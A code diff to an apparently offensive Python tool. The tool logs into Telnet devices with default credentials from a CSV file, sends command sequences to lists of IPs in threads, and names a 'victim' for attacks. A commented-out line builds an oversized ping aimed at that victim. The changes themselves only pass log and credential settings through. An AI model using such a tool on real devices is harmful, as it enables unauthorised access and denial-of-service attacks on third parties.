@@ -28,6 +28,7 @@ remote_sockets = []
 
 # Setup logs feature
 log_number = "10"
+credentials_path = "credentials/default.csv"
 
 def exit_gracefully():
     print("\n\n[!] Exiting gracefully...")
@@ -55,7 +56,7 @@ def parse_arguments():
     parser.add_argument("-iC", "--commands_list", help="\t\tPath to a file containing a list of telnet commands to execute, one per line.")
     parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
     parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
-    parser.add_argument("-g", "--log", default=4, type=int, help="\t\tLog number to save the logs.")
+    parser.add_argument("-g", "--log", default=10, type=int, help="\t\tLog number to save the logs.")
     parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
     parser.add_argument("-c", "--credentials", help="\tPass csv with username and password format for authentication")
     parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP collection or domain name).")
@@ -81,13 +82,19 @@ def find_mac_addresses(file_path):
 # Main method
 def main():
 
-    global target
+    global target, log_number, credentials_path
 
     # Parse command-line arguments
     args = parse_arguments()
 
     if args.victim:
         target = args.victim.encode('ascii')
+
+    if args.log:
+        log_number = int(args.log)
+
+    if args.credentials:
+        credentials_path = args.credentials
 
     # Option -i is provided
     if args.ip and args.port:
@@ -111,15 +118,9 @@ def main():
             #commands_seq = fuzz_proxy()
             
 
-            if args.credentials:
-                # Handle single session with provided credentials
-                #handle_target(args.ip, args.port, commands_seq, 4, True, args.credentials) # Log executed commands with True flag
-                handle_target(args.ip, args.port, commands_seq, 4, False, args.credentials) # Don't log executed commands with True flag
-
-            else:
-                # Handle single session with default credentials
-                handle_target(args.ip, args.port, commands_seq, 0.1, True) # Log executed commands with True flag
-                #handle_target(args.ip, args.port, commands_seq, 0.1, False) # Don't log executed commands with False flag
+            # Select based on if responses will be logged or not
+            # handle_target(args.ip, args.port, commands_seq, 4, True, credentials_path) # Log executed commands with True flag
+            handle_target(args.ip, args.port, commands_seq, 4, False, credentials_path) # Don't log executed commands with True flag
 
 
     # Option -iL is provided
@@ -178,8 +179,8 @@ def main():
 
 
                 # Spin up our client thread to handle incoming data
-                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, False))
-                #target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True))
+                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, False, credentials_path))
+                #target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True, credentials_path))
                 try:
                     target_handler.start()
                     #time.sleep(5)
@@ -223,7 +224,7 @@ def main():
                         commands_seq = encode_commands(args.commands_list)  # This method comes from telnet_combinations.py
 
                     # Spin up our client thread to handle incoming data
-                    target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True))
+                    target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq, 0.1, True, credentials_path))
                     try:
                         target_handler.start()
                         #time.sleep(0.1)
@@ -256,8 +257,8 @@ def main():
 # Handle each victim
 def handle_target(ip, port, command_sequence, timeout=2, detail=True, credentials_path="/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/credentials/default.csv"):
 
+    global log_number
     if detail:
-        global log_number
         log_dir =  os.getcwd() + f"/logs/logs{log_number}/" 
         log_output = log_dir + ip + f"_log{log_number}"
         log_paths = log_dir + ip + "_paths"
@@ -267,17 +268,17 @@ def handle_target(ip, port, command_sequence, timeout=2, detail=True, credential
             os.makedirs(log_dir, exist_ok=True)
 
         # Create and append socket session
-        remote_socket = telnet_auth_sequence(ip, port, credentials_path, log_output)      # log the auth sequence
+        remote_socket = telnet_auth_sequence(log_number, ip, port, credentials_path, log_output)      # log the auth sequence
         remote_sockets.append(remote_socket)
 
         # Send sequence of commands
-        response = socket_send_sequence(ip, remote_socket, command_sequence, timeout, detail, log_output)
+        response = socket_send_sequence(log_number, ip, remote_socket, command_sequence, timeout, detail, log_output)
     else:
-        remote_socket = telnet_auth_sequence(ip, port, credentials_path)                 # don't log the auth sequence
+        remote_socket = telnet_auth_sequence(log_number, ip, port, credentials_path)                 # don't log the auth sequence
         remote_sockets.append(remote_socket)
 
         # Send sequence of commands
-        response = socket_send_sequence(ip, remote_socket, command_sequence, timeout, detail)
+        response = socket_send_sequence(log_number, ip, remote_socket, command_sequence, timeout, detail)
 
 
     #ping_command = b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n'
